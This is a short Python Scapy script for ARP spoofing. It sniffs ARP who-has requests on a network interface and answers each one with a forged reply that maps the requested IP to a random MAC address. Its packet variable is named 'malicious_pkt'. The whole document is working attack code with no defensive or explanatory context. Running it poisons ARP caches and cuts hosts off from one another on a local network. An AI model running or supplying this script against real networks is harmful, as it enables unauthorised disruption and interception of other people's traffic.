from scapy.all import *

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
        )

def arp_monitor_callback(pkt):
    print(pkt.psrc) # 192.168.0.1
    print(pkt.pdst) # 192.168.0.106
    print(pkt.hwsrc) # 08:00:27:17:0c:f0
    asking_ip = pkt.pdst
    server_ip = pkt.psrc
    false_mac = rand_mac()
    if ARP in pkt and pkt[ARP].op == 1: #who-has
        malicious_pkt = ARP(op=2, pdst = server_ip, hwsrc = false_mac, psrc = asking_ip)
        send(malicious_pkt)

sniff(iface="enp0s8", prn=arp_monitor_callback, filter="arp", store=0)